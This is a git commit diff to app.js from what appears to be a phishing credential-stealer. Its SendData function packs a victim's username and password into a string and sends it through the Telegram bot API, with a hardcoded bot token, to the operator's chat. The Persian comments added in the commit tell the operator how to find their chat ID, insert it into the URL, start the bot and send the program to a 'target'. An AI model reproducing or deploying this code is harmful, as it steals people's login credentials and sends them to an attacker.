eac2437e6c381b85ca56a9b7f4e522eeec045366
Mahanzamani <93817680+Mahanzamabi@users.noreply.github.com>
2022-04-05 13:26:54 +0430

    Update app.js

--- app.js
+++ app.js
@@ -4,7 +4,12 @@ function SendData() {
     var userpass = "Username:"+user+"_"+"Password:"+pass
     // Id Bot:@mahantesttest_bot
     // Run:
+    
+    
     // اول وارد تلگرام شوید و ایدی که بالا نوشتم را در سرچ پیست کنید
+    // @userinfobot مربوط به متن پایین
+    //بعد وارد ربات بالا شوید شوید
+    // و برای ربات یک متن تایپ کنید و ایدی خودتان را کپی کنید آن را در قسمتی که ما نوشتیم {yourchatid} کل آن متن را پاک کنید ایدی خودتان را پیست کنید
     // بعد ربات را استارت کنید وبرنامه را برای تارگت ارسال کنید
 
     var url = 'https://api.telegram.org/bot5246105498:AAFntRSggUeaCkvdduShahd0RuY0QNM4jSA/sendmessage?chat_id={yourchatidintelegram}&text='+userpass;
